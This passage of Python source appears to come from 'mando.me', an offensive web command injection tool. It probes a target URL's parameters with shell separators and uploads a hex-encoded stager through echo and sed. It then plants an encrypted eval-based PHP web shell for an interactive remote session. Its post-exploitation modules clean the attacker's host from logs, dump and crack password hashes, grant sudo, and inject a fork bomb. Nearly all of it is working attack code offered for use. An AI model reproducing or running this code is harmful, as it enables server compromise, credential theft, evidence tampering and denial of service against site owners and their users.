									"description"	: "Username to sudofy",
									"validation"	: "\S+"
								},
							},
							"run"					: RunCommands.rc_enable_sudo
						},
						"log_cleaner" : {
							"name"					: "Log Cleaner",
							"description"			: "Iterates through log files and replaces a host (ip or hostname).",
							"options" : {
								"TARGET" : {
									"required" 		: True,
									"description"	: "Host to replace (ip or hostname)",
									"validation"	: "^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3})|(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$"
								}
							},
							"run"					: RunCommands.rc_log_cleaner
						},	
						"cred_crack" : {
							"name"					: "Credential Cracker",
							"description"			: "Tries to crack credentials",
							"options"				: { },
							"run"					: RunCommands.rc_cred_crack
						},
						"hash_dump" : {
							"name"					: "Password Hash Dump",
							"description"			: "Tries to dump an unshadowed password dump.",
							"options"				: { },
							"run"					: RunCommands.rc_hash_dump
						},
						"forkbomb" : {
							"name"					: "Fork Bomb Injection",
							"description"			: "Injects a fork bomb to as a DoS-attack.",
							"options" : {
								"RC_PASSWORD" : {
									"required"		: True,
									"description"	: "Run Command password",
									"validation"	: "\S+"
								}
							},
							"run"					: RunCommands.rc_forkbomb
						}
					}
				return RunCommands.command_definition
			
			@staticmethod
			def commands():
				return RunCommands.definition().keys()
			
			@staticmethod
			def get(key = None):
				return RunCommands.definition()[key if key != None else self.selected_command]
			
			@staticmethod
			def get_options():
				if RunCommands.is_selected():
					return RunCommands.get()["options"]
				else:
					return {}
			
			@staticmethod
			def is_selected():
				return True if self.selected_command != None and self.selected_command in RunCommands.commands() else False
					
			@staticmethod
			def validate(command):
				local_options = {}
				options = command["options"];

				for o in options.keys():
					option = options[o]
					option_valid = True
					try:
						if o in self.option_values:
							if "validation" in option.keys():
								option_valid = re.compile(option["validation"]).match(self.option_values[o])
							elif "list" in option.keys():
								option_valid = self.option_values[o] in option["list"]
					except:
						option_valid = False

					if not option_valid and option["required"]:						
						Print.error("The option " + o + " is required but missing or in violation")
						return False, local_options
					else: 
						local_options[o] = self.option_values[o]
						
				return True, local_options
		
		class ShellCommands(object):
			
			@staticmethod			
			def sc_use(match):
				if match:
					if match.group(1) in RunCommands.commands():
						self.selected_command = match.group(1)
					else:
						Print.error("The selected command does not exist")
				else:
					self.selected_command = None

					print("  Select one of the following commands:")
					print("  -> " + "\n  -> ".join(sorted(RunCommands.commands())))
			
			@staticmethod
			def sc_set(match):
				if match:
					self.option_values[match.group(1).upper()] = match.group(2)
					print("  " + match.group(1).upper() + " => " + match.group(2))
				else:
					Print.error("A name and a value must be defined")
					
			@staticmethod	
			def sc_options(match):
				if RunCommands.is_selected():

					command = RunCommands.get()
					options = RunCommands.get_options()

					Print.table(
						caption = command["name"], 
						headers = ["Name", "Current Setting", "Required", "Description"],
						description = command["description"],
						rows = list([{ 
							0 : option, 
							1 : self.option_values[option] if option in self.option_values.keys() else "",
							2 : ("yes" if options[option]["required"] else "no"),
							3 : options[option]["description"],
							"list" : {
								"index": 3,
								"array": options[option]["list"]
							} if "list" in options[option].keys() else None
						} for option in options.keys()])
					)
				else:
					Print.error("There is no command selected")
				Print.text()
			
			@staticmethod
			def sc_run(match):
				if RunCommands.is_selected():
					Print.status("Executing command '" + self.selected_command + "'")
					
					## Clear buffer
					self.send("")
					
					command = RunCommands.get()
					if command["run"] != None:
						command["run"](command)
				else:
					Print.error("There is no command selected")
					
			@staticmethod
			def definition():
				if not hasattr(ShellCommands, "command_definition"):
					ShellCommands.command_definition = {
						"use": {
							"description": "selects run command. Using this command without argument shows available commands, and deselects any command",
							"validation": r"use\s+([^\s]+)",
							"run": ShellCommands.sc_use,
							"state": self.interact_state.CONTINUE
						},
						"set": {
							"description": "sets values of this shell session.",
							"validation": r"set\s+([^\s]+)\s+([^\s]+)",
							"run": ShellCommands.sc_set,
							"state": self.interact_state.CONTINUE
						},
						"options": {
							"description": "Shows options in context of selected command",
							"validation": r"options",
							"run": ShellCommands.sc_options,
							"state": self.interact_state.CONTINUE
						},
						"run": {
							"description": "Executes selected command",
							"validation": r"run",
							"run": ShellCommands.sc_run,
							"state": self.interact_state.CONTINUE
						},
						"exit": {
							"description": "Abort shell",
							"validation": r"exit",
							"run": None,
							"state": self.interact_state.BREAK
						},
						"background": {
							"description": "Background shell",
							"validation": r"background",
							"run": None,
							"state": self.interact_state.BREAK
						},
						"clear": {
							"description": "Clear screen",
							"validation": r"clear",
							"run": None,
							"state": self.interact_state.CONTINUE
						}
					}
				return ShellCommands.command_definition
			
			@staticmethod
			def commands():
				return ShellCommands.definition().keys()
			
			@staticmethod
			def get(key):
				return ShellCommands.definition()[key]
		
		def sc_complete(text, state):

			paths = []

			for sc in ShellCommands.commands():	
				paths.append(sc)

				if sc.startswith(text.split(" ")[0]) and text.split(" ")[0] == sc:
					if sc == "use":
						for rc in RunCommands.commands():	
							paths.append(sc + " " + rc)
					elif sc == "set" and RunCommands.is_selected():
						for option in RunCommands.get_options():	
							paths.append(sc + " " + option + " ")

			for path in paths:					
				if path.lower().startswith(text.lower()):
					if not state:
						return path
					else:
						state -= 1

		## Define autocomplete
		readline.parse_and_bind("tab: complete")
		readline.set_completer(sc_complete)
		readline.set_completer_delims("")
		
		while True:
			try:
				_input = input("\033[4mShell\033[0m" + ("(\033[94mtty\033[0m)" if self.tty else "") + (" use(\033[91m" + self.selected_command + "\033[0m)" if self.selected_command else "") + " > ")
				_input_command = _input.split(" ")[0]
				
				if _input_command == "exit": self.close();	
				if _input_command == "clear": import subprocess as sp; sp.call("clear", shell = True);
				# ADD '?'
				
				## Check if command
				if _input_command in ShellCommands.commands():
					
					if not _input_command == "use": print("")						
						
					command = ShellCommands.get(_input_command)
					if command["run"] != None:
						command["run"](re.compile(command["validation"]).match(_input))
					
					if command["state"] == self.interact_state.BREAK: break
					if command["state"] == self.interact_state.CONTINUE: continue
				else:
					#Print.text(self.send(_input))
					for x in self.send(_input).strip().split("\n"): Print.text(x)
				print("")
				
			except:
				self.close()
				
	def close(self):
		self.connection.close()
		self.socket.close()
		
		if self.id >= 0:
			SessionManager.unregister(self.id)
			
		Print.warning("Socket closed by user")
		
class CommandInjector(object):
	
	@staticmethod
	def init():
		global _gs

		import subprocess as sp
		sp.call("clear",shell=True)

		for key in _gs["payloads"].keys():
			_gs["payloads"][key]["path"] = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(32)) + ".php"

		CommandInjector.exploit()
		_gs["_is_sudo"] = PHPInteractor.sudo_command("sudo whoami").strip() == "root"

		## Create directories
		_gs["dir_loot"] = _gs["dir_loot"].format(re.compile(r"^(http|https):\/\/([^\/]+)").match(_gs["url"]).group(2), time.strftime("%Y%m%d%H%M%S"))
		if not os.path.exists(_gs["dir_loot"]):
			os.makedirs(_gs["dir_loot"])
			
	@staticmethod
	def exploit():
		global _gs

		_gs["url_stager"] = None
		_placeholder = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(32))
				
		def stager_upload(url, stream, path):
			tl = 0
			counter = 1
			chunk_size = _gs["chunk_size"]
			chunk_count = math.ceil((len(stream) / 2) / chunk_size)

			try:				
				while True:
					chunk = stream[(chunk_size * 2 * (counter - 1)):][:chunk_size * 2]

					if chunk:
						if _gs["system"] == Utility.os.LINUX:
							chunk = "0x" + "0x".join([chunk[i:i + 2] for i in range(0, len(chunk), 2)])
							urllib.request.urlopen(url + ("?" +_gs["_stager"] + "=" + urllib.parse.quote_plus("echo '" + chunk + "' >> " + path))).read()
						elif _gs["system"] == Utility.os.WINDOWS:					
							urllib.request.urlopen(url + ("?" +_gs["_stager"] + "=" + urllib.parse.quote_plus("<nul set /p \".=" + chunk.decode("hex").replace("\"", "'") + "\" >> " + path))).read()

						tl = Print.status("Sending stage: {:.0%}".format((counter - 1) / chunk_count), True)
						Print.text(("\b" * tl), True)

						counter += 1
					else:
						break
				
				# Remove line breaks
				urllib.request.urlopen(url + ("?" +_gs["_stager"] + "=" + urllib.parse.quote_plus("sed -i -- ':a;N;$!ba;s/\\n//g' " + path))).read()
				
				# Replace each hex representative
				for i in range(256):
					urllib.request.urlopen(url + ("?" +_gs["_stager"] + "=" + urllib.parse.quote_plus("sed -i -- 's/0x" + str("%0.2x" % i) + r"/\x" + str("%0.2x" % i) + "/g' " + path))).read()
				Print.text((tl - Print.success("Payload injected through stager", True)) * " ")

			except:
				Print.text((tl - Print.error("Failed to inject payload", True)) * " ")
				sys.exit(2)
			finally:	
				urllib.request.urlopen(url + ("?" +_gs["_stager"] + "=" + urllib.parse.quote_plus("rm " + _gs["payloads"]["stager"]["path"]))).read()
				Print.success("Stager removed")

		def technique_result_based():
			Print.status("METHOD: Result based injection")

			for special in ["", "& ", "; ", "| ", "&;& "]:

				def interactor(command, internal = False):
					import difflib
					
					url = _gs["url"]
					
					if _gs["get"] != None:
						url = url + "?" + urllib.parse.urlencode(json.loads(_gs["get"].replace("'", "\"").replace("_INJECT_", "\"" + special + command + "\"")))

					if _gs["post"] != None:
						request = urllib.request.Request(url, headers=urllib.parse.urlencode(json.loads(_gs["post"].replace("'", "\"").replace("_INJECT_", "\"" + special + command + "\""))))
					else:
						request = urllib.request.Request(url)
						
					if not _gs["cookies"] == None:
						request.add_header("cookie", _gs["cookies"])

					response = urllib.request.urlopen(request).read()

					if internal:
						return response
					else:
						result = ""
						normal_response = interactor("", True)

						for i, s in enumerate(difflib.ndiff(normal_response, response)):
							if s[0] == " ": continue
							elif s[0] == "+": result = result + chr(int(s.replace("+","").strip()))
								
						return result.replace(command, "")

				if _placeholder == interactor("echo " + _placeholder).strip():
					Print.success("Injection method is working => '" + special +  "echo " + _placeholder + "'")

					os = _gs["system"] = Utility.get_os(interactor)
					Print.info("System seems to be: " + enum_name(os, Utility.os))

					if os == Utility.os.LINUX:
						Print.status("Uploading stager")
						interactor("echo '0x" + "0x".join([_gs["payloads"]["stager"]["payload"][i:i + 2] for i in range(0, len(_gs["payloads"]["stager"]["payload"]), 2)]) + "' >> " + _gs["payloads"]["stager"]["path"])
						for i in range(256):
							interactor("sed -i -- 's/0x" + str("%0.2x" % i) + r"/\\x" + str("%0.2x" % i) + "/g' " + _gs["payloads"]["stager"]["path"])
						#interactor(r"for i in {0..255}; do sed -i -- \"s/0x$( printf '%02x' $i)/\\x$( printf '%02x' $i)/g\" " + _gs["payloads"]["stager"]["path"] + "; done")
						
					elif os == Utility.os.WINDOWS:
						Print.status("Uploading stager")
						interactor("echo " + re.compile(r"[\<\>]").sub(r"^\g<0>", _gs["payloads"]["stager"]["payload"].decode("hex")).replace("\"", "\\\"") + " >> " +_gs["payloads"]["stager"]["path"])
					else:
						Print.error("The system is unsupported for this exploit.")
						Print.status("Aborting all further objectives!")
						sys.exit(2)

					_gs["url_stager"] = _gs["url"][:_gs["url"].rfind("/") + 1] + _gs["payloads"]["stager"]["path"]

					Print.success("Stager is uploaded")
					return True

			Print.error("Injection method is not working")
			return False
		
		def technique_blind_file_based():
			Print.status("METHOD: Blind file based injection")

			for special in ["", "& ", "; ", "| ", "&;& "]:

				def interactor(command, internal = False):
					import difflib
					
					url = _gs["url"]
					
					if _gs["get"] != None:
						url = url + "?" + urllib.parse.urlencode(json.loads(_gs["get"].replace("'", "\"").replace("_INJECT_", "\"" + special + command + "\"")))

					if _gs["post"] != None:
						request = urllib.request.Request(url, headers=urllib.parse.urlencode(json.loads(_gs["post"].replace("'", "\"").replace("_INJECT_", "\"" + special + command + "\""))))
					else:
						request = urllib.request.Request(url)

					if not _gs["cookies"] == None:
						request.add_header("cookie", _gs["cookies"])

					response = urllib.request.urlopen(request).read()

					if internal:
						return response
					else:
						result = ""
						normal_response = interactor("", True)

						for i, s in enumerate(difflib.ndiff(normal_response, response)):
							if s[0] == " ": continue
							elif s[0] == "+": result = result + chr(int(s.replace("+","").strip()))
								
						return result.replace(command, "")
					
				def check_placeholder(_placeholder):
					try:
						interactor("echo " + _placeholder + " >> " + _placeholder)
						return _placeholder == urllib.request.urlopen(_gs["url"][:_gs["url"].rfind("/") + 1] + _placeholder).read().strip()
					except:
						return ""

				if check_placeholder(_placeholder):
					Print.success("Injection method is working => '" + special +  "echo " + _placeholder + " >> " + _placeholder + "'")

					os = _gs["system"] = Utility.get_os(interactor)
					Print.info("System seems to be: " + enum_name(os, Utility.os))

					if os == Utility.os.LINUX:
						
						Print.status("Removing indicator")
						interactor("/bin/rm -f " + _placeholder)
						
						Print.status("Uploading stager")
						interactor("echo '0x" + "0x".join([_gs["payloads"]["stager"]["payload"][i:i + 2] for i in range(0, len(_gs["payloads"]["stager"]["payload"]), 2)]) + "' >> " + _gs["payloads"]["stager"]["path"])
						for i in range(256):
							interactor("sed -i -- 's/0x" + str("%0.2x" % i) + r"/\\x" + str("%0.2x" % i) + "/g' " + _gs["payloads"]["stager"]["path"])
						
					elif os == Utility.os.WINDOWS:
						Print.status("Removing indicator")
						interactor("del /f " + _placeholder)
						
						Print.status("Uploading stager")
						interactor("echo " + re.compile(r"[\<\>]").sub(r"^\g<0>", _gs["payloads"]["stager"]["payload"].decode("hex")).replace("\"", "\\\"") + " >> " +_gs["payloads"]["stager"]["path"])
						
					else:
						Print.error("The system is unsupported for this exploit.")
						Print.status("Aborting all further objectives!")
						sys.exit(2)

					_gs["url_stager"] = _gs["url"][:_gs["url"].rfind("/") + 1] + _gs["payloads"]["stager"]["path"]

					Print.success("Stager is uploaded")
					return True

			Print.error("Injection method is not working")
			return False

		## Queue techniques
		techniques = [
			technique_result_based,
			technique_blind_file_based,
		]

		Print.text()
		Print.status("Testing different injection techniques")

		for technique in techniques:
			if technique() and not _gs["url_stager"] == None:
				
				# Collect information
				''' Don't make this optional
				if Print.confirm("Encrypt response"):
					_gs["smplshll_response_encryption"] = True
				else:
					_gs["smplshll_response_encryption"] = False
					_gs["payloads"]["smplshll"]["payload"] = _gs["payloads"]["smplshll"]["payload"].replace("72657475726e20285f637279707428225f5f494e505f5053575f5f222c20246275666665722c2022656e63727970742229293b", "72657475726e20246275666665723b")
				'''
				
				Print.status("Setting up encryption")
				_gs["smplshll_response_encryption"] = True
							
				# Prepare payload
				_gs["_var_eval"] = "".join(random.SystemRandom().choice(string.ascii_uppercase) for x in range(8))
				_gs["_var_exec"] = "".join(random.SystemRandom().choice(string.ascii_uppercase) for x in range(8))
				_gs["_var_sudo"] = "".join(random.SystemRandom().choice(string.ascii_uppercase) for x in range(8))
				_gs["_var_sudo_prompt"] = "".join(random.SystemRandom().choice(string.ascii_uppercase) for x in range(8))
				_gs["smplshll_main_password_var"] = "".join(random.SystemRandom().choice(string.ascii_uppercase) for x in range(8))
				_gs["smplshll_main_password"] = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(32))
				_gs["smplshll_input_password"] = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(32))
				_gs["payloads"]["smplshll"]["payload"] = Utility.crypt(
					_gs["smplshll_main_password"],
					Utility.hexToStr(_gs["payloads"]["smplshll"]["payload"]).replace(
						"__INP_PSW__", _gs["smplshll_input_password"]
					).replace(
						"__INP_VAR_EVAL__", _gs["_var_eval"]
					).replace(
						"__INP_VAR_EXEC__", _gs["_var_exec"]
					).replace(
						"__INP_VAR_SUDO__", _gs["_var_sudo"]
					).replace(
						"__INP_VAR_SUDO_PROMPT__", _gs["_var_sudo_prompt"]
					)
				)
				
				_1 = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(8))
				time.sleep(0.1)
				_2 = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(8))
				time.sleep(0.1)
				_3 = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(8))
				time.sleep(0.1)
				_4 = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(8))
				time.sleep(0.1)
				_5 = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(8))
				time.sleep(0.1)
				_6 = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(8))
				time.sleep(0.1)
				_7 = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(8))
				time.sleep(0.1)
				_8 = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(8))

				_gs["payloads"]["smplshll"]["payload"] = "3c3f7068702066756e6374696f6e20{0}2824{2}2c2024{3}2c2024{4}203d2027{5}2729207b2024{6}203d2027273b206966202824{4}20213d3d2027{5}27297b2024{3}203d206261736536345f6465636f64652824{3}293b207d20666f7220282024{7}203d20303b2024{7}203c207374726c656e2824{3}293b2024{7}2b2b29207b2024{8}203d206f7264287375627374722824{3}2c2024{7}29293b206966202824{4}203d3d2027{5}2729207b2024{8}202b3d206f7264287375627374722824{2}2c20282824{7}202b2031292025207374726c656e2824{2}292929293b2024{6}202e3d206368722824{8}20262030784646293b207d20656c7365207b2024{8}202d3d206f7264287375627374722824{2}2c20282824{7}202b2031292025207374726c656e2824{2}292929293b2024{6}202e3d20636872286162732824{8}2920262030784646293b207d207d2069662824{4}203d3d2027{5}2729207b2024{6}203d206261736536345f656e636f64652824{6}293b207d2072657475726e2024{6}3b207d206576616c28{0}28245f5345525645525b22485454505f{1}225d2c2027{9}272c2027{0}2729293b3f3e".format(
					Utility.strToHex(_1),
					Utility.strToHex(_gs["smplshll_main_password_var"]),
					Utility.strToHex(_2),
					Utility.strToHex(_3),
					Utility.strToHex(_4),
					Utility.strToHex(_5),
					Utility.strToHex(_6),
					Utility.strToHex(_7),
					Utility.strToHex(_8),
					Utility.strToHex(_gs["payloads"]["smplshll"]["payload"])
				)
				
				stager_upload(_gs["url_stager"], _gs["payloads"]["smplshll"]["payload"], _gs["payloads"]["smplshll"]["path"])
				_gs["url_exec"] = _gs["url"][:_gs["url"].rfind("/") + 1] + _gs["payloads"]["smplshll"]["path"]
				_gs["url"] = _gs["url_exec"]
				return

		Print.error("System could not be exploited")
		sys.exit(2)
	
def main(argv):
	global _gs, help_notes
	
	try:
		opts, args = getopt.getopt(argv, "",
		[
			"help",
			"url=",
			"post=",
			"get=",
			"cookies=",
		])
	except getopt.GetoptError as err:
		print(help_notes)
		print(err)
		sys.exit(2)
	for opt, arg in opts:
		if opt in ("--help"):
			print(help_notes)
			sys.exit()
		elif opt in ("--url"): _gs["url"] = arg
		elif opt in ("--post"): _gs["post"] = arg
		elif opt in ("--get"): _gs["get"] = arg
		elif opt in ("--cookies"): _gs["cookies"] = arg

	if (not _gs["url"] == ""):
		
		try:
			urllib.request.urlopen(_gs["url"]).read()
		except urllib.URLError as e:
			print("\n  \033[91mCannot access the interface\033[0m")
			sys.exit(2)

		## Initialize command injector
		CommandInjector.init()
		
		## Set initial global settings
		_gs["working_directory"] = MandoCommand.mc_pwd()
		_gs["initial_path"] = _gs["working_directory"]
		_gs["shell_path"] = _gs["initial_path"] + MandoCommand.separator() + _gs["url"][_gs["url"].rfind("/") + 1:]
		_gs["system"] = Utility.get_os(PHPInteractor.command)

		Print.text("\033[38;5;160m" + r"                        _                        " + "\033[0m")
		Print.text("\033[38;5;161m" + r"  /\/\   __ _ _ __   __| | ___   _ __ ___   ___  " + "\033[0m")
		Print.text("\033[38;5;162m" + r" /    \ / _` | '_ \ / _` |/ _ \ | '_ ` _ \ / _ \ " + "\033[0m")
		Print.text("\033[38;5;163m" + r"/ /\/\ \ (_| | | | | (_| | (_) || | | | | |  __/ " + "\033[0m")
		Print.text("\033[38;5;164m" + r"\/    \/\__,_|_| |_|\__,_|\___(_)_| |_| |_|\___| " + "\033[0m")
		Print.text("\033[38;5;130m" + r"     _          _ _                              " + "\033[0m")
		Print.text("\033[38;5;131m" + r" ___| |__   ___| | |                             " + "\033[0m")
		Print.text("\033[38;5;132m" + r"/ __| '_ \ / _ \ | |  Web Command Injection 0.1  " + "\033[0m")
		Print.text("\033[38;5;133m" + r"\__ \ | | |  __/ | |  Created by z0noxz          " + "\033[0m")
		Print.text("\033[38;5;134m" + r"|___/_| |_|\___|_|_|                             " + "\033[0m")
		MandoCommand.mc_status()
		
		local_files = [] # GET LIST OF LOCAL FILES (EXECUTING PATH) FOR UPLOAD
		local_ips = Utility.ip4_addresses()
		
		while (True):
			
			remote_files = PHPInteractor.command("cd " + _gs["working_directory"] + " && ls -Rp | awk '/:$/&&f{s=$0;f=0}/:$/&&!f{sub(/:$/,\"\");s=$0;f=1;next}NF&&f{ print s\"/\"$0 }' | grep -v '/$'").strip().split("\n")
			
			def ssc_complete(text, state):
				
				paths = []
				
				for cmd in MandoCommand.commands():	
					paths.append(cmd)					

					if cmd.startswith(text.split(" ")[0]) and text.split(" ")[0] == cmd:
						if cmd == "download":
							for x in remote_files:
								paths.append(cmd + " " + x)
						elif cmd == "shell":
							for x in local_ips:
								paths.append(cmd + " " + x)
								
				for path in paths:					
					if path.lower().startswith(text.lower()):
						if not state:
							return path
						else:
							state -= 1

			## Define autocomplete
			readline.parse_and_bind("tab: complete")
			readline.set_completer(ssc_complete)
			readline.set_completer_delims("")
			
			
			user_input = input("\033[4mmando.me\033[0m > ").strip()
						
			if (not MandoCommand.command(user_input)):
				if _gs["system"] == Utility.os.LINUX:
					output = PHPInteractor.command("cd " + _gs["working_directory"] + " && " + user_input + " && printf \"\n\" && pwd").strip().split("\n")
				elif _gs["system"] == Utility.os.WINDOWS:
					output = PHPInteractor.command("cd " + _gs["working_directory"] + " && " + user_input + " && echo. && echo %cd%").strip().split("\n")
				else:
					output = ""
				
				_gs["working_directory"] = Utility.check_working_directory(_gs["working_directory"], output[len(output) - 1])
				for x in (output[:(len(output) - 1) - output[::-1].index("")] if '' in output else output[:len(output) - 1]): Print.text(x)
				#print "  " + "\n  ".join((output[:(len(output) - 1) - output[::-1].index("")] if '' in output else output[:len(output) - 1]))
try:
	def handler(signum, frame):
		void = None
		## TODO :: Get the current input and paste message as:
		#  ssc > shell[ctrl+c]
		#  =>
		#  ssc > shellInterrupt: use the 'exit' command to quit
		#  ssc > shell
		#print "Interrupt: use the 'exit' command to quit"
	signal.signal(signal.SIGINT, handler)
	signal.signal(signal.SIGTSTP, handler)
	
	if __name__ == "__main__": main(sys.argv[1:])
except Exception as err:
	import traceback
	
	print("")
	Print.error("Something went wrong. Terminating program.")
	print("")
	print("\033[91m")
	print(traceback.print_exc(file=sys.stdout))
	print("\033[0m")
	
	MandoCommand.mc_exit(None)
	